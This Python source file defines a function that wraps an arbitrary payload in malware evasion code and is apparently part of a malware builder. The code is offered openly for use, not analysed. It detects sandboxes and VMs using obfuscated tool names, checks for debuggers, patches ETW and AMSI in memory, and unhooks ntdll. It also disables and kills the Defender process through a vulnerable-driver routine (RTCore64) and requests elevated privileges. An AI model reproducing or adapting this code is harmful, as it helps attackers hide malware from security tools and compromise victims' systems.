def add_evasion_features(code: str,os: str, kill_date: str = "") -> str:
    evasion_code = []

    if kill_date:
        evasion_code.append(f"""
from datetime import datetime
if datetime.now() > datetime.strptime("{kill_date}", "%Y-%m-%d"):
    import sys
    sys.exit(0)
""")
    if os == "linux":

        evasion_code.append("""
def check_environment():
    import os, socket
    suspicious_indicators = {
        'hostnames': ['sandbox', 'analysis', 'malware', 'cuckoo', 'vm', 'vbox', 'virtual'],
        'users': ['user', 'sandbox', 'vmuser']
    }
    try:
        hostname = socket.gethostname().lower()
        if any(h in hostname for h in suspicious_indicators['hostnames']):
            return False
    except: pass
    try:
        username = os.getenv("USER", "").lower()
        if any(u in username for u in suspicious_indicators['users']):
            return False
    except: pass
    return True

#if not check_environment():
#   import sys; sys.exit(0)
    """)
        
    else:
        evasion_code.append("""
import base64
import ctypes
import os
import platform
import random
import socket
import struct
import subprocess
import sys
import time
import winreg
import psutil   
import pefile   
from capstone import Cs, CS_ARCH_X86, CS_MODE_32, CS_MODE_64  

def dec(s): return base64.b64decode(s).decode()
def anti_analysis():
    if os.cpu_count() < 4:
        return False
    if psutil.virtual_memory().total < 4*1024**3:  
        return False
    for _ in range(10):
            x = random.randint(0, 65535)
            y = random.randint(0, 65535)
            try:
                ctypes.windll.user32.SetCursorPos(x, y)
            except:
                pass
            time.sleep(random.uniform(0.05, 0.2))    
    processes = [dec(b'd2lyZXNoYXJrLmV4ZQ=='), dec(b'cHJvY21vbi5leGU='), dec(b'cHJvY2V4cC5leGU='), dec(b'eDY0ZGJnLmV4ZQ=='), 
                    dec(b'b2xseWRiZy5leGU='), dec(b'aWRhcTY0LmV4ZQ=='), dec(b'ZmlkZGxlci5leGU='), dec(b'cHJvY21vbjY0LmV4ZQ==')]
    try:
        for proc in psutil.process_iter(['name']):
            proc_name = proc.info['name'].lower() if proc.info['name'] else ""
            if any(name in proc_name for name in processes):
                return False
    except:
        pass
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, dec(b'SEFSRHdBUkVXQVJFXERFU0NSSVBUSU9OXFN5c3RlbVxCSU9T'))
        try:
            manufacturer, _ = winreg.QueryValueEx(key, dec(b'U3lzdGVtTWFudWZhY3R1cmVy'))
            vm_indicators = [dec(b'dm13YXJl'), dec(b'dmlydHVhbGJveA=='), dec(b'cWVtdQ=='), dec(b'bWljcm9zb2Z0IGNvcnBvcmF0aW9u'), dec(b'eGVu'), dec(b'aHlwZXItdg=='), dec(b'bWxhZ2VudA==')]  # Added Hyper-V and AI agents
            if any(vm in manufacturer.lower() for vm in vm_indicators):
                winreg.CloseKey(key)
                return False
        except FileNotFoundError:
            pass
        try:
            product, _ = winreg.QueryValueEx(key, dec(b'U3lzdGVtUHJvZHVjdE5hbWU='))
            vm_products = [dec(b'dm13YXJl'), dec(b'dmlydHVhbGJveA=='), dec(b'dmlydHVhbCBtYWNoaW5l'), dec(b'a3Zt'), dec(b'aHlwZXItdg==')]
            if any(vm in product.lower() for vm in vm_products):
                winreg.CloseKey(key)
                return False
        except FileNotFoundError:
            pass     
        winreg.CloseKey(key)
    except Exception:
        pass
    try:
        vm_services = [dec(b'dm10b29scw=='), dec(b'dmJveHNlcnZpY2U='), dec(b'eGVuc2VydmljZQ=='), dec(b'bWxhZ2VudA==')]  # Added ML agents
        for proc in psutil.process_iter(['name']):
            proc_name = proc.info['name'].lower() if proc.info['name'] else ""
            if any(service in proc_name for service in vm_services):
                return False
    except:
        pass 
    # Added: Noise to confuse AI/ML (benign API calls)
    for _ in range(5):
        os.getpid()  # Benign call
        time.sleep(0.01)
    return True

def get_instruction_length(addr, max_bytes=16):
    try:
        code = (ctypes.c_ubyte * max_bytes).from_address(addr)
        code_bytes = bytes(code)
        mode = CS_MODE_32 if sys.maxsize <= 2**32 else CS_MODE_64
        md = Cs(CS_ARCH_X86, mode)
        for ins in md.disasm(code_bytes, addr):
            return ins.size  
        return 1
    except:
        return 1

def disable_etw_patch():
    try:
        ntdll = ctypes.windll.ntdll
        kernel32 = ctypes.windll.kernel32
        addr = ctypes.cast(ntdll.EtwEventWrite, ctypes.c_void_p).value
        if not addr:
            raise OSError("Failed to resolve EtwEventWrite address")
        size = get_instruction_length(addr, max_bytes=16)
        old_prot = ctypes.c_ulong()
        addr_ptr = ctypes.c_void_p(addr)
        if not kernel32.VirtualProtect(addr_ptr, size, 0x40, ctypes.byref(old_prot)):
            raise OSError("Failed to change memory protection")
        patch = (ctypes.c_ubyte * size)(*([0xC3] * size))
        ctypes.memmove(addr_ptr, patch, size)
        kernel32.VirtualProtect(addr_ptr, size, old_prot.value, ctypes.byref(old_prot))
        return True
    except Exception:
        return False

def patch_amsi_dynamic():
    try:
        amsi_dll = ctypes.windll.LoadLibrary(dec(b'YW1zaS5kbGw='))  # Obfuscated DLL name
        if not amsi_dll:
            return False       
        scan_buffer_addr = ctypes.windll.kernel32.GetProcAddress(amsi_dll._handle, b"AmsiScanBuffer")
        if not scan_buffer_addr:
            return False      
        old_protect = ctypes.c_ulong()
        PAGE_EXECUTE_READWRITE = 0x40   
        if not ctypes.windll.kernel32.VirtualProtect(scan_buffer_addr, 20, PAGE_EXECUTE_READWRITE, ctypes.byref(old_protect)):
            return False        
        # Enhanced: More patch variants (inspired by 2025 Medusa/Play)
        patch_patterns = [
            bytes([0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]),  
            bytes([0x31, 0xC0, 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]),  
            bytes([0x68, 0x57, 0x00, 0x07, 0x80, 0x58, 0xC3]),  
            bytes([0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3]),  # Null return variant
            bytes([0x90] * 6)  # NOP sled variant
        ]  
        patch = random.choice(patch_patterns)
        ctypes.memmove(scan_buffer_addr, patch, len(patch))
        ctypes.windll.kernel32.VirtualProtect(scan_buffer_addr, 20, old_protect.value, ctypes.byref(old_protect))
        return True
    except Exception:
        return False

class CONTEXT64(ctypes.Structure):
    _fields_ = [
        ("P1Home", ctypes.c_ulonglong),
        ("P2Home", ctypes.c_ulonglong),
        ("P3Home", ctypes.c_ulonglong),
        ("P4Home", ctypes.c_ulonglong),
        ("P5Home", ctypes.c_ulonglong),
        ("P6Home", ctypes.c_ulonglong),
        ("ContextFlags", ctypes.c_ulong),
        ("MxCsr", ctypes.c_ulong),
        ("SegCs", ctypes.c_ushort),
        ("SegDs", ctypes.c_ushort),
        ("SegEs", ctypes.c_ushort),
        ("SegFs", ctypes.c_ushort),
        ("SegGs", ctypes.c_ushort),
        ("SegSs", ctypes.c_ushort),
        ("EFlags", ctypes.c_ulong),
        ("Dr0", ctypes.c_ulonglong),
        ("Dr1", ctypes.c_ulonglong),
        ("Dr2", ctypes.c_ulonglong),
        ("Dr3", ctypes.c_ulonglong),
        ("Dr6", ctypes.c_ulonglong),
        ("Dr7", ctypes.c_ulonglong),
        ("Rax", ctypes.c_ulonglong),
        ("Rcx", ctypes.c_ulonglong),
        ("Rdx", ctypes.c_ulonglong),
        ("Rbx", ctypes.c_ulonglong),
        ("Rsp", ctypes.c_ulonglong),
        ("Rbp", ctypes.c_ulonglong),
        ("Rsi", ctypes.c_ulonglong),
        ("Rdi", ctypes.c_ulonglong),
        ("R8", ctypes.c_ulonglong),
        ("R9", ctypes.c_ulonglong),
        ("R10", ctypes.c_ulonglong),
        ("R11", ctypes.c_ulonglong),
        ("R12", ctypes.c_ulonglong),
        ("R13", ctypes.c_ulonglong),
        ("R14", ctypes.c_ulonglong),
        ("R15", ctypes.c_ulonglong),
        ("Rip", ctypes.c_ulonglong),
    ]

def security_checks():
    time.sleep(random.uniform(0.5, 2.0))  # Delay to mimic legit app
    try:
        disable_etw_patch()
    except:
        pass 
    if ctypes.windll.kernel32.IsDebuggerPresent():
        return False    
    debug_present = ctypes.c_bool()
    try:
        if ctypes.windll.kernel32.CheckRemoteDebuggerPresent(
            ctypes.windll.kernel32.GetCurrentProcess(), 
            ctypes.byref(debug_present)
        ) and debug_present.value:
            return False
    except:
        pass    
    start = time.perf_counter()
    try:
        ctypes.windll.kernel32.OutputDebugStringA(b"")
    except:
        pass
    end = time.perf_counter()
    if (end - start) > 0.5:  
        return False    
    try:
        context = CONTEXT64()
        context.ContextFlags = 0x100010  
        current_thread = ctypes.windll.kernel32.GetCurrentThread()    
        if ctypes.windll.kernel32.GetThreadContext(current_thread, ctypes.byref(context)):
            if any([context.Dr0, context.Dr1, context.Dr2, context.Dr3]):
                return False
    except:
        pass  
    try:
        vbs = ctypes.c_uint32()
        ctypes.windll.ntdll.RtlGetEnabledExtendedFeatures(
            ctypes.c_ulonglong(0x1), 
            ctypes.byref(vbs)
        )
        if vbs.value & 0x01:  
            return False
    except:
        pass
    indic = {
        'hostnames': ['sandbox', 'analysis', 'malware', 'cuckoo', 'vm', 'vbox', 'virtual'],
        'users': ['user', 'sandbox', 'vmuser', 'analyst', 'malware']
    }  
    try:
        hostname = socket.gethostname().lower()
        if any(h in hostname for h in indic['hostnames']):
            return False
    except:
        pass
    try:
        username = os.getenv("USERNAME", "").lower()  
        if any(u in username for u in indic['users']):
            return False
    except:
        pass    
    if not anti_analysis():
        return False

    return True   

def unhook_dll(dll_name="ntdll.dll"):
    
    try:
        windir = os.environ.get('WINDIR', r'C:\Windows')
        dll_path = os.path.join(windir, 'System32', dll_name)
        if not os.path.exists(dll_path):
            return False    
        with open(dll_path, 'rb') as f:
            clean_dll = f.read()
        pe = pefile.PE(data=clean_dll)
        text_section = None
        for section in pe.sections:
            if section.Name.decode().strip('\x00') == '.text':
                text_section = section
                break
        if not text_section:
            return False     
        text_data = text_section.get_data()
        text_rva = text_section.VirtualAddress   
        hmodule = ctypes.windll.kernel32.GetModuleHandleW(dll_name)
        if not hmodule:
            return False       
        text_addr = hmodule + text_rva
        
        old_protect = ctypes.c_ulong()
        PAGE_EXECUTE_READWRITE = 0x40    
        if not ctypes.windll.kernel32.VirtualProtect(
            ctypes.c_void_p(text_addr),
            len(text_data),
            PAGE_EXECUTE_READWRITE,
            ctypes.byref(old_protect)
        ):
            return False   
        ctypes.memmove(
            ctypes.c_void_p(text_addr),
            ctypes.create_string_buffer(text_data),
            len(text_data)
        )    
        ctypes.windll.kernel32.VirtualProtect(
            ctypes.c_void_p(text_addr),
            len(text_data),
            old_protect.value,
            ctypes.byref(old_protect)
        )   
        return True
    except Exception:
        return False
    
class RTC64_MEMORY_STRUCT(ctypes.Structure):
    _fields_ = [
        ("unknown0", ctypes.c_uint8 * 8),
        ("address", ctypes.c_uint64),
        ("unknown1", ctypes.c_uint8 * 4),
        ("offset", ctypes.c_uint32),
        ("size", ctypes.c_uint32),
        ("value", ctypes.c_uint32),
        ("unknown2", ctypes.c_uint8 * 16),
    ]

def byoi_bypass(edr_process="MsMpEng.exe"):
    svc_name = "RTCore64"
    driver_path = "RTCore64.sys"
    device = None  # Initialize to None for cleanup

    try:
        
        if platform.system() != 'Windows':
            return False
        
        # Check for HVCI with error handling
        try:
            hvci_check = subprocess.check_output("bcdedit /enum | findstr hypervisorlaunchtype", shell=True).decode().lower()
            if "auto" in hvci_check or "on" in hvci_check:
                return False
        except subprocess.CalledProcessError as e:
            return False
        driver_data = base64.b64decode("<base64_encoded_RTCore64_sys>")  
        with open(driver_path, "wb") as f:
            f.write(driver_data)
                
        subprocess.check_output(["sc.exe", "create", svc_name, f"binPath= {driver_path}", "type=kernel"])        
        subprocess.check_output(["sc.exe", "start", svc_name])
        device = ctypes.windll.kernel32.CreateFileA(b"\\\\.\\RTCore64", 0xC0000000, 0, None, 3, 0, None)
        if device == -1:
            raise Exception("Failed to open device")
                
        IOCTL_READ = 0x80002048
        IOCTL_WRITE = 0x8000204C
        
        def read_primitive(address, size):
            mem_struct = RTC64_MEMORY_STRUCT()
            mem_struct.address = address
            mem_struct.size = size
            bytes_returned = ctypes.c_uint()
            if not ctypes.windll.kernel32.DeviceIoControl(device, IOCTL_READ, ctypes.byref(mem_struct), ctypes.sizeof(mem_struct), ctypes.byref(mem_struct), ctypes.sizeof(mem_struct), ctypes.byref(bytes_returned), None):
                raise Exception("Read failed")
            return mem_struct.value
        
        def write_primitive(address, size, value):
            mem_struct = RTC64_MEMORY_STRUCT()
            mem_struct.address = address
            mem_struct.size = size
            mem_struct.value = value
            bytes_returned = ctypes.c_uint()
            if not ctypes.windll.kernel32.DeviceIoControl(device, IOCTL_WRITE, ctypes.byref(mem_struct), ctypes.sizeof(mem_struct), ctypes.byref(mem_struct), ctypes.sizeof(mem_struct), ctypes.byref(bytes_returned), None):
                raise Exception("Write failed")
        
        def read8(address):
            low = read_primitive(address, 4)
            high = read_primitive(address + 4, 4)
            return low | (high << 32)
        
        def read4(address):
            return read_primitive(address, 4)
        
        def write1(address, value):
            write_primitive(address, 1, value)
        
        def get_kernel_base():
            lpImageBase = (ctypes.c_ulonglong * 1024)()
            lpcbNeeded = ctypes.c_ulonglong()
            ctypes.windll.psapi.EnumDeviceDrivers(ctypes.byref(lpImageBase), ctypes.sizeof(lpImageBase), ctypes.byref(lpcbNeeded))
            return lpImageBase[0]
        
        kernel_base = get_kernel_base()
        
        def rva_to_offset(rva, data):
            e_lfanew = struct.unpack("<I", data[0x3C:0x40])[0]
            number_of_sections = struct.unpack("<H", data[e_lfanew + 6:e_lfanew + 8])[0]
            optional_header_size = struct.unpack("<H", data[e_lfanew + 0x14:e_lfanew + 0x16])[0]
            section_header = e_lfanew + 0x18 + optional_header_size
            for i in range(number_of_sections):
                virtual_address = struct.unpack("<I", data[section_header + 0xC:section_header + 0x10])[0]
                size = struct.unpack("<I", data[section_header + 0x8:section_header + 0xC])[0]
                raw_address = struct.unpack("<I", data[section_header + 0x14:section_header + 0x18])[0]
                if virtual_address <= rva < virtual_address + size:
                    return rva - virtual_address + raw_address
                section_header += 0x28
            raise Exception("RVA not found")
        
        def get_export_rva(symbol, data):
            e_lfanew = struct.unpack("<I", data[0x3C:0x40])[0]
            optional_header = e_lfanew + 0x18
            export_rva = struct.unpack("<I", data[optional_header + 0x58:optional_header + 0x5C])[0]
            export_offset = rva_to_offset(export_rva, data)
            number_of_names = struct.unpack("<I", data[export_offset + 0x18:export_offset + 0x1C])[0]
            address_of_functions = struct.unpack("<I", data[export_offset + 0x1C:export_offset + 0x20])[0]
            address_of_names = struct.unpack("<I", data[export_offset + 0x20:export_offset + 0x24])[0]
            address_of_ordinals = struct.unpack("<I", data[export_offset + 0x24:export_offset + 0x28])[0]
            for i in range(number_of_names):
                name_rva = struct.unpack("<I", data[rva_to_offset(address_of_names, data) + i*4 : rva_to_offset(address_of_names, data) + i*4 + 4])[0]
                name_offset = rva_to_offset(name_rva, data)
                name = data[name_offset : data.find(b'\0', name_offset)].decode()
                if name == symbol:
                    ordinal = struct.unpack("<H", data[rva_to_offset(address_of_ordinals, data) + i*2 : rva_to_offset(address_of_ordinals, data) + i*2 + 2])[0]
                    function_rva = struct.unpack("<I", data[rva_to_offset(address_of_functions, data) + ordinal*4 : rva_to_offset(address_of_functions, data) + ordinal*4 + 4])[0]
                    return function_rva
            raise Exception("Symbol not found")
        
        with open(r"C:\Windows\System32\ntoskrnl.exe", "rb") as f:
            ntos_data = f.read()
                
        ps_initial_rva = get_export_rva("PsInitialSystemProcess", ntos_data)
        ps_initial_address = kernel_base + ps_initial_rva
        system_eprocess = read8(ps_initial_address)
        OFFSET_ACTIVE_PROCESS_LINKS = 0x448
        OFFSET_UNIQUE_PROCESS_ID = 0x440
        OFFSET_PROTECTION = 0x87a
        edr_pid = None
        for p in psutil.process_iter(['pid', 'name']):
            if p.info['name'] == edr_process:
                edr_pid = p.info['pid']
                break
        if not edr_pid:
            raise Exception("EDR process not found")
                
        current_eprocess = system_eprocess
        while True:
            next_eprocess = read8(current_eprocess + OFFSET_ACTIVE_PROCESS_LINKS) - OFFSET_ACTIVE_PROCESS_LINKS
            current_pid = read8(current_eprocess + OFFSET_UNIQUE_PROCESS_ID)
            if current_pid == edr_pid:
                break
            current_eprocess = next_eprocess
            if current_eprocess == system_eprocess:
                raise Exception("EDR EPROCESS not found")
                
        protection_address = current_eprocess + OFFSET_PROTECTION
        write1(protection_address, 0)
        
        subprocess.check_output(f"taskkill /f /im {edr_process}", shell=True)
        
        if device is not None:
            ctypes.windll.kernel32.CloseHandle(device)
        subprocess.check_output(["sc.exe", "stop", svc_name])
        subprocess.check_output(["sc.exe", "delete", svc_name])
        os.remove(driver_path)
        return True
    except Exception as e:
        # Cleanup on failure
        try:
            if device is not None:
                ctypes.windll.kernel32.CloseHandle(device)
            os.system(f"sc stop {svc_name}")
            os.system(f"sc delete {svc_name}")
            if os.path.exists(driver_path):
                os.remove(driver_path)
        except Exception as cleanup_e:
            pass
        return False
    
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

def elevate_privileges():
    try:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 0)
        #sys.exit(0)  # Exit current instance after elevation
    except Exception:
        pass
############################# Checks execute #############################
try:
    if not is_admin():
        elevate_privileges()
    if not security_checks():
        sys.exit(0)
    unhook_dll("ntdll.dll")  
    unhook_dll("amsi.dll")
    patch_amsi_dynamic()   
    byoi_bypass() 
except Exception as e:
    sys.exit(0)
                            
     """)



        
    return '\n'.join(evasion_code) + '\n' + code
